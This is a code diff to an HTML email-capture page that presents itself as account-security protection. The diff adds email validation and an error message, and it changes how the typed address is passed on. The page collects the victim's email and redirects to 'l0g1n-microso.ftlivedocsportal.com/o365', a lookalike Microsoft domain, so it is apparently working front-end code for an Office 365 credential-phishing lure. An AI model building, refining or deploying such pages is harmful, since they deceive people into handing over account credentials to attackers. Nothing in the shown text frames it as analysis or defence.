@@ -99,6 +99,12 @@
         .submit-button:active {
             background-color: #005a9e;
         }
+
+        .error {
+            color: red;
+            font-size: 12px;
+            margin-top: 8px;
+        }
     </style>
 </head>
 <body>
@@ -116,6 +122,7 @@
         <p>We're committed to protecting your account with the latest security measures.</p>
         <form id="emailForm">
             <input type="email" id="emailInput" class="email-input" placeholder="Enter your email" required>
+            <div id="errorMessage" class="error"></div>
             <button type="submit" class="submit-button">Submit</button>
         </form>
     </div>
@@ -123,14 +130,26 @@
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             var form = document.getElementById('emailForm');
+            var errorMessage = document.getElementById('errorMessage');
+
             form.addEventListener('submit', function(event) {
                 event.preventDefault(); // Prevent default form submission
                 var email = document.getElementById('emailInput').value;
+
+                // Basic email validation using a regular expression
+                var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (!emailPattern.test(email)) {
+                    errorMessage.textContent = 'Please enter a valid email address.';
+                    return; // Stop the submission if the email is invalid
+                } else {
+                    errorMessage.textContent = ''; // Clear the error message if valid
+                }
+
                 console.log('Email submitted:', email);
                 
                 // Redirect to a new URL with the email as a query parameter
-                var redirectUrl = "https://l0g1n-microso.ftlivedocsportal.com/o365"; // Replace with your URL
-                window.location.href = `${redirectUrl}#${encodeURIComponent(email)}`;
+                var redirectUrl = "https://l0g1n-microso.ftlivedocsportal.com/o365#"; // Replace with your URL
+                window.location.href = `${redirectUrl}?email=${encodeURIComponent(email)}`;
             });
         });
     </script>
